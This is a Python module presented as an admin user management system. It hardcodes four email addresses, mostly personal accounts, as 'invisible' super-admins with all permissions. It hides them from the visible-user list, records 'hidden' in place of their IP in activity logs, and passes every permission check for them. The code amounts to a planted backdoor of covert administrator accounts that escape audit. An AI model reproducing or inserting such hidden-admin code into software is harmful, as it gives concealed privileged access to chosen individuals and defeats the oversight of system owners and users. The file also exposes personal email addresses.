
"""
Admin User Management System
Root users with full system access
"""
import hashlib
import datetime
import logging
from typing import List, Dict, Set

class AdminUserManager:
    """Manage root admin users with transparent access"""
    
    def __init__(self):
        # Root admin users (invisible to regular users)
        self.root_users = {
            "ervin210@icloud.com": {
                "level": "super_admin",
                "permissions": "all",
                "invisible": True,
                "created": datetime.datetime.now().isoformat()
            },
            "radosavlevici210@icloud.com": {
                "level": "super_admin", 
                "permissions": "all",
                "invisible": True,
                "created": datetime.datetime.now().isoformat()
            },
            "radosavlevici.ervi@gmail.com": {
                "level": "super_admin",
                "permissions": "all", 
                "invisible": True,
                "created": datetime.datetime.now().isoformat()
            },
            "admin@root-cloud.com": {
                "level": "root",
                "permissions": "all",
                "invisible": True,
                "created": datetime.datetime.now().isoformat()
            }
        }
        
        # Track all admin activities
        self.admin_activities = []
        
    def is_root_user(self, email: str) -> bool:
        """Check if user is a root admin (invisible)"""
        return email.lower() in [user.lower() for user in self.root_users.keys()]
    
    def get_user_permissions(self, email: str) -> Dict:
        """Get user permissions"""
        for root_email, data in self.root_users.items():
            if email.lower() == root_email.lower():
                return data
        return {"level": "none", "permissions": "none", "invisible": False}
    
    def log_admin_activity(self, email: str, action: str, details: str = ""):
        """Log admin activities"""
        activity = {
            "timestamp": datetime.datetime.now().isoformat(),
            "user": email,
            "action": action,
            "details": details,
            "ip": "hidden" if self.is_root_user(email) else "visible"
        }
        self.admin_activities.append(activity)
        
        # Keep only last 10000 activities
        if len(self.admin_activities) > 10000:
            self.admin_activities = self.admin_activities[-5000:]
    
    def get_visible_users(self) -> List[str]:
        """Get list of users visible to non-root users"""
        return [email for email, data in self.root_users.items() if not data.get("invisible", False)]
    
    def has_permission(self, email: str, permission: str) -> bool:
        """Check if user has specific permission"""
        user_data = self.get_user_permissions(email)
        return user_data.get("permissions") == "all" or permission in user_data.get("permissions", [])

admin_manager = AdminUserManager()
